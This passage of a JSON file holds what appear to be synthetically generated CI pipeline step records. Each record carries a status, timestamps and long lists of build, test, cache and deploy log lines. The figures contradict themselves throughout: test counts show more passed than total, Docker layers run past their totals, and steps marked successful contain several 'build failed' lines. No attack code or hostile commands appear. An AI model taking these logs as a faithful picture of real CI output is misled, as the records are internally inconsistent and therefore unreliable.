          "Image pulled successfully",
          "Completed.",
          "Step 8/15: Testing",
          "Time: 48.969s",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "OK",
          "Step 18/18: Linting",
          "Pulling image: alpine:3.11",
          "Environment: test",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Uploading artifact 'build' (34 files)",
          "\u2713 test completed",
          "HEAD is now at c67b5f2",
          "[12:19:20] INFO: Processing request",
          "Step 18/20: Running migrations",
          "npm notice: package.json updated",
          "pip install: Successfully installed prettier-5.9",
          "Platform: linux-x64",
          "Ran 171 tests in 21s",
          "Switched to branch 'bugfix/task-468'",
          "Pushing to registry...",
          "  PASS: unit/test_api_health.spec.js",
          "Cache saved successfully",
          "Snapshots: 33 passed, 21 total",
          "\u2713 All checks passed",
          "Loading...",
          "Completed.",
          "Compiling src/service.java...",
          "Connecting to example.com:443...",
          "\u2713 Step 'build' succeeded",
          "GET /api - 204 (12ms)",
          "pip install: Successfully installed axios-1.19",
          "Step 14/21: Running migrations",
          "Image pulled successfully",
          "[12:19:20] INFO: Connecting to database",
          "[12:19:20] WARN: Deprecated API usage",
          "  PASS: test_auth_login (351ms)",
          "Switched to branch 'feature/task-131'",
          "Step 11/23: Running migrations",
          "Fetching submodules...",
          "\u2713 Task completed in 3175ms",
          "Tests: 86 passed, 340 total",
          "Installing jest@5.19.10",
          "\u2713 Step 'test' succeeded",
          "Test Suites: 48 passed, 17 total",
          "Coverage: 89% statements, 84% branches",
          "Installing react@3.5.8",
          "OK",
          "Step 4/25: Running migrations",
          "Waiting...",
          "Tests: 470 passed, 258 total",
          "Connection established",
          "Bundling main.js",
          "Image pulled successfully",
          "pip: Downloading react-1.0.tar.gz",
          "Compiling components/handler.rs...",
          "Compiling utils/main.py...",
          "Pulling image: node:18",
          "Cache hit for key-7634",
          "[12:19:20] DEBUG: Query executed in 68ms",
          "TLS handshake completed",
          "WARNING: express has known vulnerabilities",
          "Platform: win32-x64",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-05T12:20:53.817718",
        "finished_at": "2025-12-05T12:21:07.198993",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Waiting...",
          "HEAD is now at a731ad5",
          "npm notice: created a lockfile",
          "[12:19:20] DEBUG: Memory usage: 861MB",
          "[12:19:20] DEBUG: Memory usage: 217MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Bundling runtime.js",
          "yarn add: Done in 18.90s",
          "[12:19:20] DEBUG: Loading configuration",
          "Switched to branch 'bugfix/task-254'",
          "[12:19:20] ERROR: Connection failed",
          "Compiling components/handler.rs...",
          "\u2717 build failed with exit code 9",
          "Step 7/19: Installing dependencies",
          "pip: Installing build dependencies...",
          "Step 1/15: Deploying",
          "Using Python 3.11",
          "Compiling components/utils.go...",
          "Step 11/25: Building",
          "Step 19/24: Building",
          "Cache restored successfully (400MB)",
          "GET /api - 200 (53ms)",
          "Artifact downloaded: 10MB",
          "[12:19:20] INFO: Starting build process",
          "Using Node.js 19.11.8",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Node.js 20.3.8",
          "Environment: staging",
          "\u2717 build failed with exit code 35",
          "Compiling components/handler.rs...",
          "[12:19:20] DEBUG: Initializing service",
          "Using Python 3.10",
          "Ready.",
          "[12:19:20] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "yarn add: Done in 30.83s",
          "Step 14/19: Installing dependencies",
          "[12:19:20] DEBUG: Connection pool: 7 active",
          "\u2713 All checks passed",
          "[12:19:20] DEBUG: Connection pool: 9 active",
          "HEAD is now at 56def68",
          "Connection established",
          "[12:19:20] DEBUG: Query executed in 95ms",
          "[12:19:20] INFO: Starting build process",
          "Cache saved successfully",
          "Coverage: 82% statements, 89% branches",
          "Connecting to test.io:443...",
          "Test Suites: 18 passed, 19 total",
          "Using Node.js 18.13.1",
          "\u2713 Task completed in 2915ms",
          "Pushing to registry...",
          "npm install: resolved 952 packages",
          "Checking out master branch",
          "Ready.",
          "[12:19:20] DEBUG: Connection pool: 8 active",
          "pip: Downloading lodash-5.14.tar.gz",
          "\u2713 validate completed",
          "Image pulled successfully",
          "[12:19:20] INFO: Cache refreshed",
          "Uploading artifact 'dist' (12 files)",
          "Ready.",
          "Creating production build...",
          "Step 4/23: Installing dependencies",
          "Optimizing 98 modules...",
          "Connection established",
          "Step 1/18: Testing",
          "Exception: RuntimeError",
          "Switched to branch 'feature/task-128'",
          "NODE_ENV=production",
          "Optimizing 35 modules...",
          "Step 4/15: Testing",
          "Transforming 570 files...",
          "\u2713 build completed",
          "Artifact downloaded: 37MB",
          "Artifact downloaded: 28MB",
          "Pulling image: alpine:latest",
          "Creating production build...",
          "Artifact uploaded: dist.zip (18MB)",
          "Step 12/19: Installing dependencies",
          "Coverage: 80% statements, 60% branches",
          "GET /health - 204 (12ms)",
          "Generating source maps...",
          "Step 13/20: Building",
          "[12:19:20] INFO: Starting build process",
          "Cache restored successfully (357MB)",
          "Compiling components/app.ts...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "Artifact downloaded: 10MB",
          "Processing...",
          "Environment: production",
          "Exception: RuntimeError",
          "[12:19:20] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "HEAD is now at 82795f6",
          "Bundling runtime.css",
          "Minifying app.js",
          "[12:19:20] INFO: Starting build process",
          "Loading...",
          "POST /api - 201 (90ms)",
          "Generating source maps...",
          "Step 7/20: Testing",
          "Image pulled successfully",
          "npm install: added 121 packages",
          "[12:19:20] INFO: Starting build process",
          "Minifying vendor.js",
          "Success!",
          "HEAD is now at ba1dcf0",
          "Time: 78.205s",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "Using Python 3.12",
          "yarn add: Done in 11.41s",
          "[12:19:20] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-6596",
          "[12:19:20] WARN: Deprecated API usage",
          "[12:19:20] INFO: Connecting to database",
          "[12:19:20] DEBUG: Initializing service",
          "Generating source maps...",
          "[12:19:20] DEBUG: Query executed in 95ms",
          "Pulling image: alpine:3.11",
          "[12:19:20] WARN: Deprecated API usage",
          "Time: 52.955s",
          "Bundling styles.css",
          "Step 6/17: Building",
          "  PASS: unit/test_db_connect.spec.js",
          "Cache invalidated: node_modules",
          "Checking out develop branch",
          "Step 9/25: Testing",
          "Creating production build...",
          "Installing prettier@3.13.7",
          "Step 13/25: Building",
          "\u2717 build failed with exit code 39",
          "Cache restored successfully (199MB)",
          "  PASS: integration/test_user_create.spec.js",
          "Cache miss for key-6624",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting jest",
          "HEAD is now at aba21ed",
          "\u2717 build failed with exit code 12",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (60MB)",
          "Coverage: 98% statements, 67% branches",
          "WARNING: eslint has known vulnerabilities",
          "Done.",
          "[12:19:20] DEBUG: Loading configuration",
          "Cache hit for key-4627",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 1396ms",
          "\u2713 build completed",
          "pip: Installing build dependencies...",
          "Connecting to acme.corp:443...",
          "Artifact downloaded: 3MB",
          "Fetching submodules...",
          "Ready.",
          "TLS handshake completed",
          "Completed.",
          "  PASS: unit/test_db_connect.spec.js",
          "Tests: 215 passed, 454 total",
          "Ready.",
          "Using Python 3.9",
          "npm install: added 53 packages",
          "Compiling src/index.js...",
          "pip: Collecting webpack",
          "Bundling main.js",
          "Step 9/24: Deploying",
          "Connecting to acme.corp:443...",
          "[12:19:20] DEBUG: Connection pool: 4 active",
          "Compiling lib/service.java...",
          "Artifact uploaded: dist.zip (29MB)",
          "TLS handshake completed",
          "NODE_ENV=test",
          "Optimizing 26 modules...",
          "\u2713 All checks passed",
          "Platform: win32-x64",
          "\u2713 All checks passed",
          "Installing prettier@4.14.7",
          "Installing express@5.16.3",
          "pip install: Successfully installed axios-3.15",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Time: 52.658s",
          "[12:19:20] ERROR: Connection failed",
          "Generating source maps...",
          "Time: 20.389s",
          "npm install: resolved 1531 packages",
          "Already up to date.",
          "[12:19:20] INFO: Starting build process",
          "Compiling lib/service.java...",
          "Step 7/19: Linting",
          "WARNING: axios has known vulnerabilities",
          "[12:19:20] INFO: Request completed",
          "Pushing to registry...",
          "Minifying vendor.js",
          "Using Node.js 20.11.1",
          "[12:19:20] DEBUG: Initializing service",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading react-1.10.tar.gz",
          "[12:19:20] ERROR: Connection failed",
          "Snapshots: 12 passed, 46 total",
          "pip: Downloading prettier-1.14.tar.gz",
          "Compiling components/service.java...",
          "Step 12/19: Installing dependencies",
          "Success!",
          "Compiling src/main.py...",
          "Tests: 306 passed, 238 total",
          "Minifying app.js",
          "Artifact downloaded: 8MB",
          "Cache restored successfully (49MB)",
          "Artifact uploaded: dist.zip (80MB)",
          "pip install: Successfully installed lodash-5.0",
          "Step 19/19: Installing dependencies",
          "[12:19:20] ERROR: Connection failed",
          "Bundling main.js",
          "Waiting...",
          "GET /health - 200 (89ms)",
          "Compiling components/utils.go...",
          "Cache miss for key-3069",
          "Pulling image: alpine:18",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Success!",
          "Tests: 363 passed, 204 total",
          "Cache hit for key-1680",
          "Step 13/21: Running migrations",
          "  PASS: unit/test_cache_hit.spec.js",
          "Installing axios@1.0.3",
          "Uploading artifact 'dist' (35 files)",
          "OK",
          "Cache miss for key-2198",
          "Connecting to test.io:443...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "pip install: Successfully installed webpack-3.14",
          "Cache invalidated: dependencies",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-05T12:21:07.198993",
        "finished_at": "2025-12-05T12:21:20.580268",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Layer 5/9: ENV command",
          "Cache restored successfully (486MB)",
          "Verifying...",
          "Cache restored successfully (155MB)",
          "Step 6/21: Building",
          "OK",
          "GET /status - 204 (30ms)",
          "Installing eslint@1.11.4",
          "\u2713 build completed",
          "GET /health - 201 (51ms)",
          "Connecting to example.com:443...",
          "Switched to branch 'feature/task-871'",
          "Done.",
          "Snapshots: 44 passed, 21 total",
          "[12:19:20] WARN: Deprecated API usage",
          "Step 19/23: Testing",
          "\u2713 All checks passed",
          "[12:19:20] WARN: Deprecated API usage",
          "NODE_ENV=test",
          "Cache miss for key-7573",
          "Pulling image: python:latest",
          "pip: Collecting prettier",
          "Snapshots: 43 passed, 13 total",
          "Step 16/23: Building",
          "pip: Installing build dependencies...",
          "Transforming 648 files...",
          "Checking out main branch",
          "  PASS: test_user_create (397ms)",
          "Done.",
          "Cache saved successfully",
          "[12:19:20] ERROR: Connection failed",
          "Test Suites: 31 passed, 28 total",
          "Processing...",
          "[12:19:20] INFO: Connecting to database",
          "Already up to date.",
          "[12:19:20] DEBUG: Loading configuration",
          "[12:19:20] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:19:20] DEBUG: Loading configuration",
          "\u2713 Step 'setup' succeeded",
          "Step 1/23: Deploying",
          "Step 8/23: Building",
          "Minifying main.js",
          "Artifact uploaded: dist.zip (51MB)",
          "[12:19:20] WARN: Deprecated API usage",
          "Using Node.js 15.6.7",
          "Success!",
          "[12:19:20] ERROR: Connection failed",
          "Building Docker image...",
          "\u2713 test completed",
          "Time: 70.387s",
          "pip: Collecting jest",
          "Coverage: 78% statements, 88% branches",
          "Compiling lib/app.ts...",
          "npm install: added 414 packages",
          "Installing express@4.9.10",
          "[12:19:20] INFO: Cache refreshed",
          "npm install: resolved 1397 packages",
          "Cache restored successfully (420MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 8/20: Deploying",
          "Step 9/15: Running migrations",
          "Building Docker image...",
          "pip install: Successfully installed lodash-2.20",
          "Step 19/25: Testing",
          "Done.",
          "Uploading artifact 'build' (47 files)",
          "Bundling runtime.js",
          "Finished.",
          "FAILED: test_user_create",
          "Ready.",
          "[12:19:20] INFO: Connecting to database",
          "Processing...",
          "Layer 3/14: ENV command",
          "Installing axios@1.7.6",
          "Installing prettier@4.14.5",
          "[12:19:20] WARN: Deprecated API usage",
          "[12:19:20] DEBUG: Loading configuration",
          "Artifact downloaded: 24MB",
          "Time: 51.771s",
          "Connecting to example.com:443...",
          "Transforming 510 files...",
          "Cache restored successfully (288MB)",
          "[12:19:20] INFO: Request completed",
          "Image pulled successfully",
          "\u2713 Step 'test' succeeded",
          "TLS handshake completed",
          "FAILED: test_cache_hit",
          "Done.",
          "OK",
          "Checking out master branch",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Time: 120.167s",
          "Loading...",
          "Artifact uploaded: dist.zip (48MB)",
          "Compiling components/service.java...",
          "[12:19:20] DEBUG: Query executed in 10ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Environment: production",
          "Compiling lib/utils.go...",
          "Compiling src/service.java...",
          "Pulling image: alpine:18",
          "Step 11/20: Installing dependencies",
          "Uploading artifact 'build' (2 files)",
          "Done.",
          "Transforming 992 files...",
          "GET /api - 201 (17ms)",
          "NODE_ENV=test",
          "[12:19:20] INFO: Processing request",
          "Transforming 916 files...",
          "HEAD is now at 990001a",
          "Verifying...",
          "Time: 22.292s",
          "\u2713 Step 'install' succeeded",
          "Waiting...",
          "Step 12/18: Testing",
          "  PASS: test_auth_login (62ms)",
          "Processing...",
          "Using Python 3.12",
          "[12:19:20] DEBUG: Memory usage: 1863MB",
          "FAILED: test_api_health",
          "Using Python 3.12",
          "Step 16/23: Installing dependencies",
          "Step 7/17: Deploying",
          "Bundling runtime.js",
          "[12:19:20] WARN: Deprecated API usage",
          "POST /api - 201 (81ms)",
          "Ready.",
          "Test Suites: 41 passed, 7 total",
          "Loading...",
          "Layer 9/8: ENV command",
          "Connecting to test.io:443...",
          "Uploading artifact 'build' (40 files)",
          "Compiling lib/app.ts...",
          "[12:19:20] WARN: Deprecated API usage",
          "Layer 7/11: ENV command",
          "Cache saved successfully",
          "Building Docker image...",
          "\u2713 Task completed in 3267ms",
          "Generating source maps...",
          "Cache miss for key-5748",
          "  PASS: test_user_create (319ms)",
          "[12:19:20] ERROR: Connection failed",
          "Image pulled successfully",
          "yarn add: Done in 1.56s",
          "Image pulled successfully",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Environment: production",
          "npm notice: created a lockfile",
          "Compiling src/utils.go...",
          "Building Docker image...",
          "[12:19:20] ERROR: Connection failed",
          "\u2713 Step 'setup' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Test Suites: 39 passed, 28 total",
          "[12:19:20] INFO: Connecting to database",
          "Connecting to test.io:443...",
          "FAILED: test_cache_hit",
          "Success!",
          "Transforming 411 files...",
          "Compiling components/service.java...",
          "Completed.",
          "Artifact uploaded: dist.zip (56MB)",
          "npm notice: created a lockfile",
          "\u2713 Step 'build' succeeded",
          "Step 20/21: Building",
          "Fetching submodules...",
          "Step 12/24: Testing",
          "Verifying...",
          "[12:19:20] WARN: Deprecated API usage",
          "[12:19:20] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Compiling utils/utils.go...",
          "Artifact downloaded: 10MB",
          "Step 3/18: Installing dependencies",
          "Exception: RuntimeError",
          "Completed.",
          "Environment: production",
          "WARNING: jest has known vulnerabilities",
          "Step 1/15: Building",
          "WARNING: webpack has known vulnerabilities",
          "Ready.",
          "Waiting...",
          "pip: Collecting webpack",
          "Compiling src/service.java...",
          "Platform: win32-x64",
          "Connection established",
          "Step 16/23: Deploying",
          "Already up to date.",
          "\u2717 build failed with exit code 15",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing react@2.9.1",
          "\u2713 test completed",
          "Optimizing 33 modules...",
          "Success!",
          "Done.",
          "Artifact uploaded: dist.zip (70MB)",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Time: 6.805s",
          "Environment: test",
          "npm notice: created a lockfile",
          "[12:19:20] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Completed.",
          "pip: Installing build dependencies...",
          "Success!",
          "yarn add: Done in 14.52s",
          "Using Node.js 14.12.3",
          "pip install: Successfully installed webpack-4.7",
          "Connecting to test.io:443...",
          "Environment: development",
          "POST /api - 201 (132ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 8/24: Deploying",
          "pip: Collecting express",
          "Step 6/25: Deploying",
          "Finished.",
          "Creating production build...",
          "[12:19:20] INFO: Processing request",
          "Time: 11.68s",
          "Done.",
          "[12:19:20] DEBUG: Memory usage: 1128MB",
          "OK",
          "Cache miss for key-1939",
          "Connecting to test.io:443...",
          "Pushing to registry...",
          "OK",
          "Loading...",
          "Coverage: 87% statements, 85% branches",
          "\u2713 build completed",
          "Pulling image: alpine:latest",
          "Step 19/25: Testing",
          "Step 3/24: Installing dependencies",
          "\u2717 build failed with exit code 68",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-05T12:21:20.580268",
        "finished_at": "2025-12-05T12:21:28.609033",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Transforming 112 files...",
          "Platform: linux-x64",
          "\u2717 build failed with exit code 73",
          "Switched to branch 'feature/task-418'",
          "Ran 135 tests in 28s",
          "pip: Downloading lodash-1.15.tar.gz",
          "[12:19:20] DEBUG: Query executed in 11ms",
          "yarn add: Done in 27.0s",
          "Loading...",
          "Step 6/25: Running migrations",
          "Tests: 421 passed, 52 total",
          "Step 14/23: Installing dependencies",
          "Layer 10/8: ENV command",
          "\u2713 All checks passed",
          "\u2713 Task completed in 536ms",
          "Compiling utils/utils.go...",
          "  PASS: test_cache_hit (122ms)",
          "Artifact downloaded: 3MB",
          "Time: 12.275s",
          "Coverage: 97% statements, 93% branches",
          "Connection established",
          "Artifact uploaded: build.tar.gz (18MB)",
          "pip: Installing build dependencies...",
          "pip: Downloading prettier-4.12.tar.gz",
          "  PASS: unit/test_api_health.spec.js",
          "Pulling image: node:latest",
          "Compiling utils/app.ts...",
          "Time: 72.131s",
          "[12:19:20] ERROR: Connection failed",
          "Fetching submodules...",
          "\u2713 lint completed",
          "Compiling lib/service.java...",
          "pip: Installing build dependencies...",
          "[12:19:20] DEBUG: Loading configuration",
          "Transforming 500 files...",
          "yarn add: Done in 1.13s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Environment: staging",
          "WARNING: express has known vulnerabilities",
          "[12:19:20] WARN: Deprecated API usage",
          "Using Python 3.10",
          "Image pulled successfully",
          "Ready.",
          "Ran 87 tests in 15s",
          "Creating production build...",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Creating production build...",
          "Artifact downloaded: 1MB",
          "pip install: Successfully installed lodash-4.8",
          "TLS handshake completed",
          "Compiling components/main.py...",
          "Environment: staging",
          "Checking out main branch",
          "Step 17/19: Deploying",
          "Loading...",
          "Success!",
          "Installing lodash@5.4.1",
          "Cache saved successfully",
          "[12:19:20] DEBUG: Connection pool: 14 active",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (13 files)",
          "Fetching submodules...",
          "[12:19:20] INFO: Cache refreshed",
          "npm install: added 413 packages",
          "Artifact uploaded: dist.zip (20MB)",
          "pip: Downloading eslint-3.20.tar.gz",
          "OK",
          "Compiling components/handler.rs...",
          "pip install: Successfully installed jest-5.8",
          "HEAD is now at 0b2c287",
          "\u2713 Task completed in 2076ms",
          "Compiling src/handler.rs...",
          "Ready.",
          "Optimizing 79 modules...",
          "Loading...",
          "Tests: 444 passed, 386 total",
          "Step 4/22: Building",
          "[12:19:20] INFO: Processing request",
          "Coverage: 86% statements, 92% branches",
          "Building Docker image...",
          "Checking out main branch",
          "Success!",
          "Cache saved successfully",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "GET /api - 204 (80ms)",
          "Platform: win32-x64",
          "pip: Installing build dependencies...",
          "Tests: 278 passed, 271 total",
          "Step 7/21: Deploying",
          "GET /api - 204 (83ms)",
          "pip install: Successfully installed prettier-4.15",
          "\u2713 All checks passed",
          "Loading...",
          "Waiting...",
          "WARNING: react has known vulnerabilities",
          "Completed.",
          "Switched to branch 'bugfix/task-558'",
          "Platform: win32-x64",
          "pip install: Successfully installed lodash-5.8",
          "WARNING: lodash has known vulnerabilities",
          "Using Node.js 18.2.8",
          "Transforming 638 files...",
          "pip: Downloading webpack-5.15.tar.gz",
          "Completed.",
          "\u2713 build completed",
          "npm notice: package.json updated",
          "\u2713 build completed",
          "[12:19:20] DEBUG: Connection pool: 13 active",
          "npm notice: created a lockfile",
          "  PASS: integration/test_api_health.spec.js",
          "  PASS: test_user_create (246ms)",
          "Checking out main branch",
          "Artifact downloaded: 9MB",
          "Step 8/18: Installing dependencies",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Layer 8/12: ENV command",
          "[12:19:20] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Step 17/25: Installing dependencies",
          "Environment: test",
          "Compiling lib/main.py...",
          "Cache saved successfully",
          "Bundling runtime.css",
          "npm notice: created a lockfile",
          "Using Node.js 18.11.4",
          "Step 17/19: Installing dependencies",
          "Cache saved successfully",
          "Verifying...",
          "Completed.",
          "Artifact downloaded: 8MB",
          "[12:19:20] ERROR: Connection failed",
          "pip: Downloading jest-4.13.tar.gz",
          "FAILED: test_user_create",
          "Artifact uploaded: dist.zip (69MB)",
          "Waiting...",
          "[12:19:20] WARN: Deprecated API usage",
          "HEAD is now at b449b32",
          "[12:19:20] INFO: Request completed",
          "[12:19:20] DEBUG: Memory usage: 415MB",
          "Building Docker image...",
          "pip install: Successfully installed lodash-4.1",
          "[12:19:20] INFO: Connecting to database",
          "Compiling utils/app.ts...",
          "Step 5/25: Running migrations",
          "[12:19:20] INFO: Starting build process",
          "Cache restored successfully (141MB)",
          "\u2713 Task completed in 4219ms",
          "Cache saved successfully",
          "Connecting to example.com:443...",
          "Tests: 161 passed, 457 total",
          "pip: Installing build dependencies...",
          "Transforming 385 files...",
          "Minifying main.js",
          "[12:19:20] WARN: Deprecated API usage",
          "Step 8/17: Testing",
          "Bundling main.css",
          "HEAD is now at d5c7c61",
          "Fetching submodules...",
          "Cache restored successfully (181MB)",
          "[12:19:20] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Finished.",
          "npm install: added 66 packages",
          "Step 10/20: Building",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed eslint-1.10",
          "Cache hit for key-7801",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Verifying...",
          "Bundling runtime.js",
          "Compiling utils/main.py...",
          "Tests: 267 passed, 247 total",
          "Success!",
          "Artifact uploaded: dist.zip (26MB)",
          "[12:19:20] INFO: Cache refreshed",
          "[12:19:20] DEBUG: Query executed in 40ms",
          "Creating production build...",
          "Connection established",
          "Coverage: 77% statements, 92% branches",
          "Pushing to registry...",
          "[12:19:20] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Done.",
          "Generating source maps...",
          "FAILED: test_user_create",
          "  PASS: test_auth_login (292ms)",
          "[12:19:20] DEBUG: Connection pool: 8 active",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (41MB)",
          "npm notice: created a lockfile",
          "[12:19:20] INFO: Cache refreshed",
          "Installing axios@5.6.10",
          "[12:19:20] INFO: Cache refreshed",
          "pip: Collecting jest",
          "[12:19:20] DEBUG: Initializing service",
          "NODE_ENV=development",
          "Artifact uploaded: dist.zip (78MB)",
          "[12:19:20] WARN: Deprecated API usage",
          "Bundling main.js",
          "Checking out main branch",
          "Fetching submodules...",
          "Minifying main.js",
          "Bundling main.css",
          "[12:19:20] INFO: Processing request",
          "[12:19:20] DEBUG: Memory usage: 1093MB",
          "\u2713 Step 'install' succeeded",
          "Cache restored successfully (170MB)",
          "Compiling src/service.java...",
          "pip install: Successfully installed lodash-5.19",
          "[12:19:20] INFO: Processing request",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 15MB",
          "yarn add: Done in 29.87s",
          "Platform: darwin-arm64",
          "Step 7/18: Building",
          "Waiting...",
          "Building Docker image...",
          "Step 19/22: Deploying",
          "Step 3/16: Installing dependencies",
          "Tests: 311 passed, 145 total",
          "Completed.",
          "Optimizing 92 modules...",
          "GET /health - 200 (4ms)",
          "Fetching submodules...",
          "Compiling src/main.py...",
          "pip: Installing build dependencies...",
          "[12:19:20] INFO: Cache refreshed",
          "[12:19:20] DEBUG: Query executed in 21ms",
          "Processing...",
          "\u2713 test completed",
          "Artifact downloaded: 22MB",
          "FAILED: test_db_connect",
          "GET /health - 204 (35ms)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-05T12:21:28.609033",
        "finished_at": "2025-12-05T12:21:41.990308",
        "log_lines": [
          "=== Step: type_check ===",
          "\u2713 Step 'install' succeeded",
          "\u2717 build failed with exit code 10",
          "[12:19:20] WARN: Deprecated API usage",
          "Connecting to cloud.services:443...",
          "NODE_ENV=development",
          "HEAD is now at 45b363a",
          "[12:19:20] INFO: Cache refreshed",
          "  PASS: test_api_health (290ms)",
          "pip: Downloading lodash-1.5.tar.gz",
          "Loading...",
          "Connection established",
          "Uploading artifact 'build' (21 files)",
          "WARNING: webpack has known vulnerabilities",
          "Test Suites: 23 passed, 34 total",
          "[12:19:20] DEBUG: Connection pool: 16 active",
          "Transforming 994 files...",
          "pip: Downloading lodash-4.16.tar.gz",
          "HEAD is now at 79bfcfd",
          "Compiling src/main.py...",
          "Step 7/22: Installing dependencies",
          "[12:19:20] WARN: Deprecated API usage",
          "Tests: 340 passed, 89 total",
          "Loading...",
          "Verifying...",
          "[12:19:20] INFO: Request completed",
          "WARNING: prettier has known vulnerabilities",
          "Compiling components/main.py...",
          "WARNING: express has known vulnerabilities",
          "Fetching submodules...",
          "OK",
          "Bundling vendor.css",
          "Already up to date.",
          "Pulling image: alpine:3.11",
          "GET /status - 201 (62ms)",
          "[12:19:20] DEBUG: Loading configuration",
          "[12:19:20] INFO: Cache refreshed",
          "HEAD is now at d7fcf7a",
          "NODE_ENV=test",
          "Using Python 3.9",
          "Waiting...",
          "Cache miss for key-7380",
          "pip install: Successfully installed express-4.16",
          "npm install: added 404 packages",
          "Using Node.js 14.8.9",
          "[12:19:20] DEBUG: Query executed in 38ms",
          "[12:19:20] INFO: Starting build process",
          "Compiling src/handler.rs...",
          "Image pulled successfully",
          "Building Docker image...",
          "Using Python 3.11",
          "[12:19:20] INFO: Processing request",
          "Switched to branch 'bugfix/task-899'",
          "TLS handshake completed",
          "Cache saved successfully",
          "HEAD is now at a021d3a",
          "Test Suites: 40 passed, 14 total",
          "Compiling components/utils.go...",
          "Step 5/18: Installing dependencies",
          "Time: 24.566s",
          "Coverage: 77% statements, 75% branches",
          "Time: 28.622s",
          "Creating production build...",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:20] WARN: Deprecated API usage",
          "Pulling image: python:3.11",
          "Optimizing 58 modules...",
          "  PASS: test_cache_hit (420ms)",
          "Minifying vendor.js",
          "Minifying vendor.js",
          "[12:19:20] DEBUG: Memory usage: 938MB",
          "Uploading artifact 'coverage' (39 files)",
          "Step 2/22: Linting",
          "[12:19:20] DEBUG: Loading configuration",
          "[12:19:20] DEBUG: Connection pool: 9 active",
          "Success!",
          "pip install: Successfully installed express-4.13",
          "Step 11/21: Installing dependencies",
          "[12:19:20] ERROR: Connection failed",
          "[12:19:20] DEBUG: Initializing service",
          "Compiling components/handler.rs...",
          "[12:19:20] DEBUG: Memory usage: 1771MB",
          "Compiling utils/index.js...",
          "Generating source maps...",
          "Compiling utils/utils.go...",
          "Loading...",
          "Checking out develop branch",
          "[12:19:20] INFO: Starting build process",
          "Tests: 60 passed, 284 total",
          "Creating production build...",
          "Checking out master branch",
          "Test Suites: 29 passed, 21 total",
          "Using Node.js 20.5.8",
          "\u2713 All checks passed",
          "[12:19:20] INFO: Request completed",
          "Artifact downloaded: 40MB",
          "Installing axios@5.15.9",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:19:20] DEBUG: Memory usage: 206MB",
          "Coverage: 72% statements, 88% branches",
          "\u2713 All checks passed",
          "\u2713 Step 'setup' succeeded",
          "Optimizing 54 modules...",
          "pip: Installing build dependencies...",
          "FAILED: test_cache_hit",
          "Artifact downloaded: 4MB",
          "Already up to date.",
          "Ready.",
          "Done.",
          "[12:19:20] INFO: Request completed",
          "Tests: 89 passed, 115 total",
          "Platform: linux-x64",
          "Test Suites: 12 passed, 29 total",
          "Compiling components/handler.rs...",
          "Artifact uploaded: dist.zip (85MB)",
          "Platform: win32-x64",
          "Step 7/20: Testing",
          "[12:19:20] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "npm notice: package.json updated",
          "Connecting to cloud.services:443...",
          "[12:19:20] ERROR: Connection failed",
          "Uploading artifact 'coverage' (22 files)",
          "\u2713 All checks passed",
          "[12:19:20] INFO: Request completed",
          "Test Suites: 5 passed, 29 total",
          "Transforming 231 files...",
          "Compiling src/utils.go...",
